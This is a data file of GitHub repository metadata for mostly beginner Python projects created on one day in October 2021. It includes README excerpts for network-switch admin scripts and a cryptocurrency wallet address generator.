417213734;Algorithm_Python;https://github.com/hjmthebest/Algorithm_Python;;2021-10-14T16:57:50Z;0;0;0;
417213766;python_desafios;https://github.com/MarceloRBrito/python_desafios;Python;2021-10-14T16:57:55Z;0;0;0;
417294999;Heart-PYTHON;https://github.com/steamdz/Heart-PYTHON;Python;2021-10-14T22:05:14Z;0;0;0;Heart-PYTHON Draw Heart ❤️ - رسم قلب | Using Python Turtle ALL CODES DROPPED IN ONE FILE (aymen.py) Follow me at : Youtube : www.youtube.com/aymendev Instagram : www.instagram.com/steam_dz Facebook : www.facebook.com/zemmouri.aymen.dz HAVE GREAT DAY !  
417203197;python-pratical;https://github.com/aby80/python-pratical;Jupyter Notebook;2021-10-14T16:24:12Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417210908;python-praticals;https://github.com/kalidouball/python-praticals;Jupyter Notebook;2021-10-14T16:49:05Z;0;0;0;python-praticals 
417235014;Python-Projects;https://github.com/AodhanCorrigan/Python-Projects;;2021-10-14T18:07:14Z;0;0;0;
417271807;python-projects;https://github.com/arpit697/python-projects;Python;2021-10-14T20:22:52Z;0;0;0;
417286733;yoga-python;https://github.com/yoga-python/yoga-python;;2021-10-14T21:26:14Z;0;0;0;Yoga-python This is my public github. 
417288447;python_airflow;https://github.com/guitrein/python_airflow;;2021-10-14T21:33:55Z;0;0;0;"python_airflow Projeto para estudos de Engenheiro de Dados Nesse projeto irei utilizar Python para extrair alguns dados do Twitter, para alguns fins como: -Testar conceitos; -Padrao ELT; -Extração de Dados; -Data Lake; -Manter escalonavel e automatizado; -Diferenciar Batch de Streaming; -Usar Apache Airflow como orquestrador; -Usar Apache Spark para aprender a manipular os dados; "
417200941;Fundamental-Python;https://github.com/Pratsakorn/Fundamental-Python;Python;2021-10-14T16:17:29Z;0;0;0;
417206511;python-practicals;https://github.com/STEPHEN-NYARANGA/python-practicals;Jupyter Notebook;2021-10-14T16:35:03Z;0;0;0;python-practicals 
417232984;python-notes;https://github.com/coltenappleby/python-notes;;2021-10-14T18:00:39Z;0;0;0;python-notes notes on learning python 
417198805;udemy-python;https://github.com/ben-jerman/udemy-python;Python;2021-10-14T16:10:51Z;0;0;0;Basic information about this project. 
417199427;abhisek-python;https://github.com/Abhisek331/abhisek-python;;2021-10-14T16:12:44Z;0;0;0;abhisek-python 
417313729;Python-Review---;https://github.com/Selamelaku/Python-Review---;;2021-10-14T23:44:50Z;0;0;0;
417315749;PYTHON-REVIEW;https://github.com/PingdiRose/PYTHON-REVIEW;Jupyter Notebook;2021-10-14T23:56:03Z;0;0;0;PYTHON-REVIEW 
417205333;python-practicals;https://github.com/Ntumba1994/python-practicals;Jupyter Notebook;2021-10-14T16:31:05Z;0;0;0;
417204902;python-practicals;https://github.com/MamePenda2/python-practicals;Jupyter Notebook;2021-10-14T16:29:49Z;0;0;0;python-practicals : Mes solutions aux TP de Init2Py. 
417203575;Python_Challenges;https://github.com/jcnghm/Python_Challenges;Python;2021-10-14T16:25:31Z;0;0;0;Practice Python Algorithms and Challenges  Birthday Dictionary Caesar Cypher Log Parser Password Generator Range Sum Finder Fibonacci Numbers Webpage Decoder Cow Bull Number Guesser Sudoku Validator Millionith Fibonacci Number Isogram Checker Unique in Order Dubstep Problem Alphabet Position  
417231421;python_basic;https://github.com/javedmughal-058/python_basic;Python;2021-10-14T17:55:20Z;1;1;0;python_basic Learn python from basic. Basic python codes are available here. 
417207538;python-practicals;https://github.com/pymaty/python-practicals;Jupyter Notebook;2021-10-14T16:38:21Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417256995;Python-Calculadora;https://github.com/edumoliveira95/Python-Calculadora;TeX;2021-10-14T19:24:52Z;0;0;0;Python-Calculadora Calculadora feita em Python 
417254439;EDA-Python;https://github.com/ismaelabdisalaam/EDA-Python;Jupyter Notebook;2021-10-14T19:15:14Z;0;0;0;Exploratory Data Analysis using Python In this project our task is to gain insights into government-sponsored loans to the different business types by analysing the Paycheck Protection Program (PPP) loan data. The datset is obtained from the US small business adminstration website. Our goal is to Perform EDA on the data using any necessary data wrangling/preparation steps and create visualisations that highlighting key findings. Project Skills:Data Wrangling and visualisation Packages used: Pandas,Seaborn, pandas_profiling Link to datset: https://data.sba.gov/dataset/ppp-foia 
417259296;Python-Practice;https://github.com/JiffiPop/Python-Practice;Python;2021-10-14T19:33:29Z;0;0;0;
417203034;Python-course;https://github.com/adipeled2244/Python-course;;2021-10-14T16:23:38Z;0;0;0;
417205742;Python_Bot;https://github.com/NeGrall-Ant/Python_Bot;;2021-10-14T16:32:23Z;0;0;0;Python_Bot Bot_informer 
417205541;python-practicals;https://github.com/Sarr-birama/python-practicals;Jupyter Notebook;2021-10-14T16:31:46Z;0;0;0;Mes solutions aux TPde Init2py 
417203374;python-practicals;https://github.com/Abdoulaye2021/python-practicals;Jupyter Notebook;2021-10-14T16:24:48Z;0;0;0;python-practicals English: My solutions to the practicals of Init2Py. Fran�cais: Mes solutions aux TP de Init2Py. 
417207082;python-praticals;https://github.com/yacine-diou/python-praticals;;2021-10-14T16:36:49Z;0;0;0;python-praticals English: My solutions to the practicals of Init2Py. Fran ̧cais: Mes solutions aux TP de Init2Py. 
417207599;python-practicals;https://github.com/dijafay/python-practicals;HTML;2021-10-14T16:38:33Z;0;0;0;python-practicals My solutions to the practicals of Init2Py. 
417286214;Python_Project;https://github.com/Skipp-py/Python_Project;Python;2021-10-14T21:23:57Z;0;0;0;Python_Project 
417200005;python_tests;https://github.com/itword7111/python_tests;;2021-10-14T16:14:42Z;0;0;0;
417203588;python-practicals;https://github.com/annita-aims/python-practicals;Jupyter Notebook;2021-10-14T16:25:33Z;0;0;0;python-practicals My solutions to the practicals of Init2Py. 
417202979;python-practicals;https://github.com/frejussoro/python-practicals;Jupyter Notebook;2021-10-14T16:23:29Z;0;0;0;python-practicals Mes solutions aux TP de Init2Py. 
417223776;PROJETOS-PYTHON;https://github.com/YuriGarciaRibeiro/PROJETOS-PYTHON;Python;2021-10-14T17:29:36Z;0;0;0;Projetos em Python 🐍 Repositório usado para Estudos e Projetos da Faculdade Aplicações: -✈️Reserva de Voo  - Manipulação de arquivos .txt  -#️⃣Jogo da velha - Treino de logica  -🚜Reseva de Máquinas - Manipulção de arquivos .txt  - tratamento de erros  -🐶Marcar consultas no veterinario - Manipulção de arquivos .txt  - tratamento de erros  -🐶Marcar consultas no veterinario(Com banco de dados) - Manipulção de arquivos .txt  - tratamento de erros  - Banco de dados  -🩺Confirmar consulta com os pacientes - Pandas  - selenium  
417233619;CodigosPython;https://github.com/HenriqueSantos0/CodigosPython;Python;2021-10-14T18:02:27Z;0;0;0;
417286231;python_curso;https://github.com/ricardocidelino/python_curso;Jupyter Notebook;2021-10-14T21:24:01Z;0;0;0;python_curso Exercícios de Python 
417204478;-python-practicals-.;https://github.com/racky001/-python-practicals-.;Jupyter Notebook;2021-10-14T16:28:36Z;0;0;0;-python-practicals- Mes solutions aux TP de Init2Py 
417230951;Python_Training;https://github.com/MukundKumarMurarka/Python_Training;Python;2021-10-14T17:53:46Z;0;0;0;Python_Training 
417282147;estudos.python;https://github.com/CaianeHardt/estudos.python;Python;2021-10-14T21:05:29Z;1;1;0;estudos.python 
417215967;python-practicals;https://github.com/matydiagne/python-practicals;Jupyter Notebook;2021-10-14T17:04:08Z;0;0;0;python-practicals 
417204038;python-practicals;https://github.com/walydia/python-practicals;Jupyter Notebook;2021-10-14T16:27:08Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417205485;python-practicals;https://github.com/aichadiop2021/python-practicals;;2021-10-14T16:31:36Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417288785;Python-code;https://github.com/AlexJRichter/Python-code;Jupyter Notebook;2021-10-14T21:35:39Z;0;0;0;
417286089;Python-Scripts;https://github.com/KillaBoi/Python-Scripts;Python;2021-10-14T21:23:19Z;0;0;0;
417263486;Lab-Python;https://github.com/mruizf2/Lab-Python;;2021-10-14T19:50:06Z;0;0;0;
417301296;Ahorcado_Python;https://github.com/DanielMO7/Ahorcado_Python;Python;2021-10-14T22:37:13Z;0;0;0;
417203878;python-practicals;https://github.com/sandraKT/python-practicals;Jupyter Notebook;2021-10-14T16:26:36Z;0;0;0;python-practicals Mes solutions aux TP de Init2Py. 
417315080;python-2;https://github.com/Sarr-birama/python-2;Jupyter Notebook;2021-10-14T23:52:33Z;1;1;0;python-2 
417298704;EjerciciosPython;https://github.com/ARI3L99/EjerciciosPython;Python;2021-10-14T22:23:54Z;0;0;0;
417245104;estudos_python;https://github.com/Dturati/estudos_python;Python;2021-10-14T18:42:17Z;0;0;0;
417272255;Python-NSUT;https://github.com/Its-Surya-Gaonkar/Python-NSUT;Python;2021-10-14T20:24:55Z;0;0;0;Python-NSUT python language fol.ders 
417240641;Python-Practice;https://github.com/abigailGadams/Python-Practice;Jupyter Notebook;2021-10-14T18:26:27Z;0;0;0;
417285464;python-helloworld;https://github.com/jtbdm/python-helloworld;;2021-10-14T21:20:12Z;0;0;0;python-helloworld Cloud Native Course CI Exercise 
417280639;AISD-python-;https://github.com/statkowski1/AISD-python-;Python;2021-10-14T20:59:55Z;0;0;0;AISD-python- 
417205722;-python-practicals-;https://github.com/Lio-cmr/-python-practicals-;;2021-10-14T16:32:20Z;0;0;0;-python-practicals- 
417241062;python-1;https://github.com/adamjaber/python-1;Python;2021-10-14T18:28:00Z;0;0;0;
417295356;python_ini;https://github.com/carrkarr/python_ini;Python;2021-10-14T22:06:55Z;0;0;0;python_ini 
417207010;python--praticals;https://github.com/FatouTine97/python--praticals;Jupyter Notebook;2021-10-14T16:36:35Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417209749;python-basics;https://github.com/heartyhardy/python-basics;Python;2021-10-14T16:45:21Z;1;1;0;
417198942;demoPython;https://github.com/jb-edzang/demoPython;;2021-10-14T16:11:14Z;0;0;0;demoPython Exercices de programmation en python 
417240354;Python-operators;https://github.com/ASJADSYED08/Python-operators;Python;2021-10-14T18:25:30Z;0;0;0;
417232319;python-basics;https://github.com/LucasJC/python-basics;Python;2021-10-14T17:58:12Z;0;0;0;Python Basics Create a virtual environment # Note that python could be installed as python3 python -m venv my-virtual-env Activate / load a virtual environment # On Linux source my-virtual-env/bin/activate  # On Windows my-virtual-env\Scripts\activate.bat Install a new dependency / library python -m pip install <library-name>  # Example python -m pip install numpy Generate requirements.txt file for registering dependencies python -m pip freeze > requirements.txt Install dependencies from requirements.txt python -m pip install -r requirements.txt References Reference 
417218088;python_bootcamp;https://github.com/Maja1703/python_bootcamp;Python;2021-10-14T17:11:01Z;0;0;0;
417245191;os-python;https://github.com/mipoks/os-python;Python;2021-10-14T18:42:36Z;0;0;0;os-python  
417207714;Ejercicios_python;https://github.com/YACUERVO/Ejercicios_python;Python;2021-10-14T16:39:00Z;0;0;0;
417201975;python-practicals;https://github.com/dany237/python-practicals;Jupyter Notebook;2021-10-14T16:20:23Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417236774;python-praticals;https://github.com/timza22/python-praticals;Jupyter Notebook;2021-10-14T18:13:09Z;0;0;0;Français : Mes solutions aux travaux pratiques d'Init2Py. English: Mes solutions aux TP de Init2Py. 
417215988;python-practicals;https://github.com/pymame/python-practicals;Jupyter Notebook;2021-10-14T17:04:14Z;0;0;0;python-practicals 
417203108;LearnPython;https://github.com/ATD0166/LearnPython;Python;2021-10-14T16:23:52Z;0;0;0;
417305086;interm_python;https://github.com/kylestarrett1/interm_python;;2021-10-14T22:57:10Z;0;0;0;Fundraiser-React 
417266202;Python-HTML;https://github.com/bcha92/Python-HTML;HTML;2021-10-14T20:00:36Z;0;0;0;Python-HTML HTML webpage rendering using Python Flask 
417283668;desafios-python;https://github.com/thiagoperess/desafios-python;;2021-10-14T21:12:01Z;0;0;0;
417226897;python_web;https://github.com/yoona-J/python_web;;2021-10-14T17:40:06Z;0;0;0;
417292915;Hangman-Python;https://github.com/DianaEspitia/Hangman-Python;Python;2021-10-14T21:55:37Z;0;0;0;Hangman-Python 
417204295;python-practicals;https://github.com/mamad9633/python-practicals;Jupyter Notebook;2021-10-14T16:27:57Z;0;0;0;python-practicals My solutions to the practicals of Init2py 
417222100;python-practicals;https://github.com/fallkancou/python-practicals;Jupyter Notebook;2021-10-14T17:24:01Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417312777;python-practicals;https://github.com/Gaby-94/python-practicals;;2021-10-14T23:39:23Z;0;0;0;python-practicals 
417205044;python-practicals;https://github.com/mberry1993/python-practicals;Jupyter Notebook;2021-10-14T16:30:13Z;0;0;0;python-practicals English: My solutions to the practicals of Init2Py. Fran ̧cais: Mes solutions aux TP de Init2Py. 
417276695;python_projects;https://github.com/kevinencarnacion/python_projects;Python;2021-10-14T20:43:22Z;0;0;0;Projects in Python  This repository will include files from various projects I've undertaken both personally, and in an online course. The list of items that will be found will vary from: Simple Games Intermediate Games Simple to Intermediate Tools Logic Exercises Coding Challenges I will update the list once I've begun and have more ideas/projects underway. 
417204660;python-practicals;https://github.com/awa-22/python-practicals;Jupyter Notebook;2021-10-14T16:29:07Z;0;0;0;python-practicals 
417280641;Python_Class;https://github.com/RodrigoJaar/Python_Class;Python;2021-10-14T20:59:56Z;0;0;0;
417270575;Python-Practice;https://github.com/Joshfishman97/Python-Practice;Python;2021-10-14T20:17:47Z;1;1;0;Python-Practice- Python-Practice 
417238327;Python-Basics-;https://github.com/KreativeKaruna/Python-Basics-;;2021-10-14T18:18:34Z;0;0;0;Python-Basics- Here I have explained different types of operators in Python with examples. 
417297330;ReactPython;https://github.com/GenieWeb/ReactPython;;2021-10-14T22:16:30Z;0;0;0;ReactPython Docs from ReactPython Course 
417315661;python_practice;https://github.com/yzakwang/python_practice;;2021-10-14T23:55:46Z;0;0;0;
417201477;python-practice;https://github.com/Mariah-J/python-practice;Python;2021-10-14T16:18:59Z;0;0;0;python-practice 
417263370;inkotel-python;https://github.com/truman369/inkotel-python;Python;2021-10-14T19:49:34Z;0;0;0;"Inkotel Scripts (Python)  Скрипты для упрощения работы с коммутаторами в сети ИНКО  На данный момент реализовано:  быстрое подключение к коммутаторам в интерактивном режиме отправка произвольных команд с получением результата их выполнения локальная база данных коммутаторов с поиском по модели и расположению  Установка Клонируем репозиторий $ git clone https://git.truman.network/inkotel/scripts-python.git $ cd scripts-python [ОПЦИОНАЛЬНО] создаем виртуальное окружение $ python -m venv .venv $ source .venv/bin/activate Устанавливаем зависимости $ pip install -r requirements.txt Настройка Файлы конфигурации находятся в директории config. Используется формат YAML. Логины и пароли Файл secrets.yml содержит пароли для доступа к коммутаторам. Можно использовать как образец config/secrets.sample.yml, переименовать, и вписать свои данные.  admin_profile - профиль для узловых коммутаторов user_profile - профиль для коммутаторов уровня доступа  --- secrets:   admin_profile:     login: admin     password: adminpassword   user_profile:     login: user     password: userpassword ... Основные модули sw.py  Используется для подключения к коммутаторам и работы с ними  Можно запускать как отдельный скрипт, так и импортировать классы и функции. $ ./sw.py IP COMMAND IP ip-адрес коммутатора, поддерживается сокращенный формат x.x, в этом случае подразумевается 192.168.x.x. Практически все консольные утилиты из данного репозитория поддерживают как полный, так и сокращенный формат записи ip. COMMAND show Выводит краткую информацию о коммутаторе в виде строки формата: model [short_ip] location [--full]  Расположение коммутатора будет выделено цветом:  зеленый - обычные коммутаторы доступа ярко-красный - центральные свитчи ярко-желтый - узловые свитчи с маршрутизацией ярко-зеленый - узловые расширители портов 1G ярко-синий - узловые расширители портов 10G ярко-голубой - GPON на АТС бледно-синий - узловые расширители портов 10G с урезанной CLI серый - GPON на Осипенко, Huawey на АТС, доступа к CLI нет  Если указан флаг --full, второй строчкой выводится mac-адрес устройства. connect Подключается к коммутатору через telnet и передает управление пользователю. Стандартное приветствие коммутатора заменяется короткой строкой, генерируемой описанной выше командой show. Заголовок окна также меняется на [short_ip] location send Отправляет одну или несколько команд на коммутатор, возвращает результат выполнения команд. Команды можно разделять либо символом ';', либо новой строкой. Пустые строки и отступы при этом игнорируются. db.py  Используется для работы с локальной базой данных коммутаторов  Можно запускать как отдельный скрипт, так и импортировать классы и функции. Данные хранятся в директории data. Используется база данных SQLite. Генерация актуальной базы данных $ ./db.py generate В этом режиме из базы удаляются все старые записи, далее проверяются все возможные адреса коммутаторов и добавляются те, которые доступны на данный момент. Вся процедура на текущей сети ИНКО занимает около 2 минут из-за таймаутов ожидания недоступных коммутаторов. Вывод списка ip $ ./db.py list Выводит список всех ip адресов и общее количество записей в базе данных. Работа с конкретным ip $ ./db.py add IP $ ./db.py get IP $ ./db.py delete IP Добавление коммутатора в базу, просмотр информации из базы, удаление коммутатора. Поиск по базе $ ./db.py search STRING Выполняет поиск в названии модели или адресе установки коммутатора. wsgi.py  api модуль для работы с локальной базой данных    '/', GET - получение списка всех ip адресов коммутаторов из базы в формате json   '/', GET, POST, DELETE - просмотр, добавление, удаление коммутатора, никаких параметров передавать не нужно   Примеры использования Быстрое подключение к коммутаторам Добавляем простую функцию-алиас в .bashrc или .zshrc: tt () {     cur_dir=$(pwd)     cd ~/scripts-python     source .venv/bin/activate     python sw.py $@ connect     deactivate     cd $cur_dir } Подключаемся к коммуторам командой: $ tt 59.75 Вывод всех коммутаторов qtech $ ./db.py search qsw Отправка команд и вывод результата $ ./sw.py 59.75 send ""sh ports 1; conf ports 1 st d; sh ports 1; conf ports 1 st e"" $ ./sw.py 58.236 send ""sh run int eth 1/2; conf t; int eth 1/2; no shut; end; sh run int eth 1/2; conf t; int eth 1/2; shut;"" $ ./sw.py 59.75 send ""sh vlan dquote> create vlan 666 tag 666; conf vlan 66 add tag 1 dquote> sh vlan"" "
417263537;Python_Project;https://github.com/mahekdeep86/Python_Project;Python;2021-10-14T19:50:18Z;0;0;0;
417224841;python_scripts;https://github.com/igweckay/python_scripts;;2021-10-14T17:32:53Z;0;0;0;
417245583;ListasPython;https://github.com/MarcosPenin/ListasPython;Python;2021-10-14T18:44:02Z;0;0;0;
417314449;ML_python;https://github.com/rohitkathariya/ML_python;Python;2021-10-14T23:48:56Z;0;0;0;
417234590;UNINTER---Python;https://github.com/ich-julianopds/UNINTER---Python;;2021-10-14T18:05:45Z;0;0;0;UNINTER---Python Aulas e projetos na Uninter utilizando a linguagem Python 
417208014;python-practicals;https://github.com/Babacardiaw287/python-practicals;;2021-10-14T16:40:01Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417207165;python-praticals;https://github.com/BINTA2/python-praticals;Jupyter Notebook;2021-10-14T16:37:04Z;0;0;0;python-praticals English: My solutions to the practicals of Init2Py. Fran ̧cais: Mes solutions aux TP de Init2Py. 
417210638;python-practicals;https://github.com/ballamadoualiou/python-practicals;Jupyter Notebook;2021-10-14T16:48:12Z;0;0;0;python-practicals 
417204411;python-practicals;https://github.com/mrsgass/python-practicals;Jupyter Notebook;2021-10-14T16:28:23Z;0;0;0;#python-practicals English:My solutions to the practicals of Init2Py. Francais: Mes solutions aux TP de Init2Py. 
417204256;python_praticals;https://github.com/Sename1/python_praticals;Jupyter Notebook;2021-10-14T16:27:50Z;0;0;0;python_praticals English: My solutions to the practicals of Init2Py. Fran�cais: Mes solutions aux TP de Init2Py. 
417289918;ygocore-python;https://github.com/hinihatetsu/ygocore-python;Python;2021-10-14T21:41:21Z;0;0;0;YGO core package for Python What is this? This is a core python package for YGO. This contains basic class for YGO like Card, DuelField and Duel. Installation $ pip install git+https://github.com/hinihatetsu/ygocore-python Example from ygocore import Duel from ygocore.enums import Player  # create Duel instance duel = Duel()  # get field field = duel.field myfield, oppofield = field  # set decks duel.set_deck(Player.ME, num_of_main=40, num_of_extra=15) duel.set_deck(Player.OPPONENT, num_of_main=60, num_of_extra=0) ToDo  More docstring Improve test coverage  
417206312;Python-Test;https://github.com/Tentrillicom/Python-Test;Python;2021-10-14T16:34:18Z;0;0;0;Python-Test Testing Python | Hi, i'm just uploading some projects, feel free to use them however you want :3 
417288476;Python_Project;https://github.com/mkrelyt/Python_Project;;2021-10-14T21:34:06Z;0;0;0;Python_Project 
417199300;hw-python;https://github.com/khch1997/hw-python;Python;2021-10-14T16:12:20Z;0;0;0;https://github.com/khch1997/hw-python 
417218029;python_bootcamp;https://github.com/PiotrKucharski85/python_bootcamp;Python;2021-10-14T17:10:48Z;0;0;0;
417249656;UCLA-Python;https://github.com/rick0224/UCLA-Python;;2021-10-14T18:59:05Z;0;0;0;
417238582;python_minigame;https://github.com/Nervok373/python_minigame;Python;2021-10-14T18:19:29Z;0;0;0;
417205799;python-practicals;https://github.com/waidklim/python-practicals;Jupyter Notebook;2021-10-14T16:32:35Z;0;0;0;python-practicals Mes solutions aux TP de Init2Py. 
417204432;-python-practicals-;https://github.com/ndeyesdiop/-python-practicals-;Jupyter Notebook;2021-10-14T16:28:26Z;0;0;0;-python-practicals- My solutions to the practicals of Init2Py. 
417204753;python-practicals;https://github.com/WIN91/python-practicals;Jupyter Notebook;2021-10-14T16:29:21Z;0;0;0;My solutions to the practicals of Init2Py 
417293310;hw-python;https://github.com/DatTriTat/hw-python;Python;2021-10-14T21:57:25Z;0;0;0;https://github.com/DatTriTat/hw-python 
417242954;ETL---Python;https://github.com/CiprianoLuis/ETL---Python;Python;2021-10-14T18:34:33Z;0;0;0;ETL---Python Projeto realizado para leitura de arquivos .xls (Excel 2006) e registro dos dados processados em banco SQL Server em Cloud (RDS Amazon)) 
417229053;LCA-Python;https://github.com/lih426/LCA-Python;Python;2021-10-14T17:47:13Z;0;0;0;LCA-Python 
417310977;python_traceroute;https://github.com/dbrentley/python_traceroute;Python;2021-10-14T23:29:16Z;0;0;0;python_traceroute 
417202633;Python-Course;https://github.com/NoorHajDawood/Python-Course;;2021-10-14T16:22:19Z;0;0;0;
417214077;Python_Examples;https://github.com/colloboh/Python_Examples;;2021-10-14T16:58:56Z;0;0;0;
417260986;mdd_Python;https://github.com/Mustafa5040/mdd_Python;;2021-10-14T19:40:22Z;0;0;0;mdd_Python Bu repo Mustafa Dursun tarafından alınan Python notlarından oluşan bir dökümandır. Python öğrenmede işinize yarar umarım. Bu kodları çalıştırmak için bir Python IDE'sine ihtiyacınız var. Pycharm gibi IDE'leri tercih edebilir veya Jupyter gibi online IDE'leri tercih edebilirsiniz. NOT: DEVAMI GELECEK. 
417274540;python-exercicios;https://github.com/MatheusOliveiraIII/python-exercicios;Python;2021-10-14T20:33:59Z;0;0;0;python-exercicios python-exercicios python-exercicios 
417204349;python-practicals;https://github.com/ollegrekam/python-practicals;Jupyter Notebook;2021-10-14T16:28:08Z;0;0;0;python-practicals 
417312583;projeto_python;https://github.com/beltessazar/projeto_python;Python;2021-10-14T23:38:22Z;0;0;0;
417292326;Curso-Python;https://github.com/SandroS22/Curso-Python;Python;2021-10-14T21:52:55Z;0;0;0;
417212932;python-praticals;https://github.com/wouissiakou/python-praticals;Jupyter Notebook;2021-10-14T16:55:19Z;0;0;0;python-praticals 
417309684;Homework-Python;https://github.com/baovu98/Homework-Python;Python;2021-10-14T23:21:46Z;0;0;0;https://github.com/baovu98/Homework-Python Helllooooo 
417206559;-python-practicals-.;https://github.com/binetalo/-python-practicals-.;Jupyter Notebook;2021-10-14T16:35:12Z;0;0;0; python-practicals  English: My solutions to the practicals of Init2Py Francais: Mes solutions aux TP de Init2Py 
417201958;python-practicals;https://github.com/nabzina/python-practicals;Jupyter Notebook;2021-10-14T16:20:20Z;0;0;0;python-practicals Mes solutions aux TP de Init2Py. 
417203085;python-practicals;https://github.com/Michael-Attoh/python-practicals;Jupyter Notebook;2021-10-14T16:23:49Z;0;0;0;python-practicals 
417203900;python-practicals;https://github.com/Lio-cmr/python-practicals;;2021-10-14T16:26:42Z;0;0;0;python-practicals 
417208972;python_bot;https://github.com/cocoakrispies93/python_bot;;2021-10-14T16:43:03Z;0;0;0;
417218012;python_bootcamp;https://github.com/pprzemyslaw/python_bootcamp;Python;2021-10-14T17:10:45Z;0;0;0;
417255771;python_hw;https://github.com/kimnguyen4497/python_hw;;2021-10-14T19:20:14Z;0;0;0;python_hw 
417307937;15-puzzle;https://github.com/h-weng/15-puzzle;Python;2021-10-14T23:11:26Z;0;0;0;"15-puzzle Python implementation of 15-puzzle using Breath First Search; this implementation solves the 15-puzzle and outputs the path of the solution.  "
417220649;EasyLinks;https://github.com/acmpesuecc/EasyLinks;Python;2021-10-14T17:19:07Z;1;1;5;EasyLinks description A fast as hell link redirecting service / shortening service. This project has complete intention to be hosted and server millions of peopl. With millions of link mappings come a problem , SEARCH IS SLOW , Introducing : Redis.This project uses FastAPI and Redis and is specifically built for speed. Getting started I dont want pull requests coming in that break the whole system. So please test your changes before pr. 
417219948;python-crashcourse-traversymedia;https://github.com/dewanwakilahmed/python-crashcourse-traversymedia;Python;2021-10-14T17:16:51Z;0;0;0;python-crashcourse-traversymedia 
417202474;python_ex1;https://github.com/tuvalbarak/python_ex1;;2021-10-14T16:21:47Z;0;0;0;
417199641;discord-python-bot;https://github.com/Arnav1505/discord-python-bot;;2021-10-14T16:13:32Z;0;0;0;discord-python-bot 
417249923;Udemy-Python-Django-Blog;https://github.com/amaso7/Udemy-Python-Django-Blog;;2021-10-14T19:00:06Z;0;0;0;
417231984;Jogo-da-velha-python;https://github.com/RodrigoAnjos2004/Jogo-da-velha-python;Python;2021-10-14T17:57:04Z;0;0;0;Jogo-da-velha-python jogo da velha feito em python 
417297376;Todo-Python-Flask;https://github.com/AkhilMovva/Todo-Python-Flask;HTML;2021-10-14T22:16:42Z;0;0;0;"Todo-Python-Flask Simple Todo list Using Python Flask  https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/  $python - from app import db - db.create_all() - exit() Host the app on HEROKU https://www.heroku.com/ https://devcenter.heroku.com/articles/heroku-cli touch Procfile web: gunicorn app:app heroku login  git init git add . git commit -m ""Init app"" heroku create flaskpythonTodo git remote -v git push remote -v   "
417279486;python-discord-bot;https://github.com/Stolek007/python-discord-bot;Python;2021-10-14T20:55:03Z;0;0;0;python-discord-bot 
417283347;Python-Terminal-Blog;https://github.com/jedoreh/Python-Terminal-Blog;Python;2021-10-14T21:10:24Z;0;0;0;
417247315;Functions-and-docstrings-python;https://github.com/ASJADSYED08/Functions-and-docstrings-python;Python;2021-10-14T18:50:24Z;0;0;0;
417201838;python_data_science;https://github.com/evencoding/python_data_science;Jupyter Notebook;2021-10-14T16:19:59Z;0;0;0;
417262353;alura-python-extrator-url;https://github.com/cglima/alura-python-extrator-url;Python;2021-10-14T19:45:36Z;0;0;0;
417315917;MachineLearningUsingPython;https://github.com/asrithak9/MachineLearningUsingPython;Jupyter Notebook;2021-10-14T23:56:59Z;0;0;0;
417241191;tergol1python;https://github.com/NajeebJaba/tergol1python;;2021-10-14T18:28:26Z;0;0;0;
417231975;Data-analysis-in-Python;https://github.com/Narasimha18BBTCS058/Data-analysis-in-Python;Jupyter Notebook;2021-10-14T17:57:02Z;0;0;0;Data-analysis-in-Python 
417228613;Python--rock-paper-scissors;https://github.com/FredrickAdjei/Python--rock-paper-scissors;Python;2021-10-14T17:45:42Z;0;0;0;Python--rock-paper-scissors wrote a rock paper scissors game in python it tells how many times you won and how many times the computer also won and also how many draws when you end the gamw 
417250636;Chives-wallet-python;https://github.com/HiveProject2021/Chives-wallet-python;Python;2021-10-14T19:02:13Z;0;0;0;"Chives wallet python  1 Generate mnemonic words. 2 Create a specified number of sub-private keys, sub-public keys and address pairs. 3 Support all Chia fork address generation in one program. 4 Check the balance of the specified address. 5 Transfer money, support change. 6 Transfer function has test on Chives, Chia, Flax, Flora, Hddcoin, GreenDoge, Spare.  How to install  Download Chives-blockchain Install and start node Upload the v3_chives_address.py to dir ~/chives-blockchain/tests/wallet  How to use  cd ~/chives-blockchain/tests/wallet Execute Simple 1: python3 v3_chives_address.py Execute Simple 2: python3 v3_chives_address.py xch Execute Simple 3: python3 v3_chives_address.py xcc 30 Execute Simple 4: python3 v3_chives_address.py xcc 10 Execute Simple 5: python3 v3_chives_address.py xch 10 ""account cover west two aunt museum angle mystery reject movie moment october vendor advice poet cement case raven minor remain betray alert spirit supply"" Execute Simple 6: python3 v3_chives_address.py xfx 50 ""account cover west two aunt museum angle mystery reject movie moment october vendor advice poet cement case raven minor remain betray alert spirit supply"" Execute Simple 7: /home/ubuntu/chives-blockchain/venv/bin/python3 /home/ubuntu/chives-blockchain/tests/wallet/v3_chives_address.py xcc 15 Three parameters are supported: address prefix, number of address pairs generated, and private key generated by specifying mnemonic words. Execute Simple 7 used for other program calls, or put into ubuntu cron for execution.  Transfer Code Release  2021-11-30 will be public  "
417227717;Voice-Assistance-through-Python;https://github.com/Palaksharma-dotcom/Voice-Assistance-through-Python;Python;2021-10-14T17:42:48Z;0;0;0;
417291188;Python-Bruteforce-Script;https://github.com/aboalsim114/Python-Bruteforce-Script;;2021-10-14T21:47:18Z;0;0;0;
417205168;DesignPatternsPython;https://github.com/trinhvietthanh/DesignPatternsPython;Python;2021-10-14T16:30:36Z;0;0;0;
417301320;python-project-lvl2;https://github.com/siderai/python-project-lvl2;Python;2021-10-14T22:37:18Z;0;0;0;Hexlet tests and linter status:  
417253311;DeteccaodeImagem-YOLO-Python;https://github.com/Rodrigodante11/DeteccaodeImagem-YOLO-Python;Python;2021-10-14T19:10:58Z;0;0;0;decteccaodeImagem-YOLO-OPENCV-pYTHON decteccaodeImagem-YOLO-OPENCV-pYTHON DeteccaodeImagem-YOLO-Python 
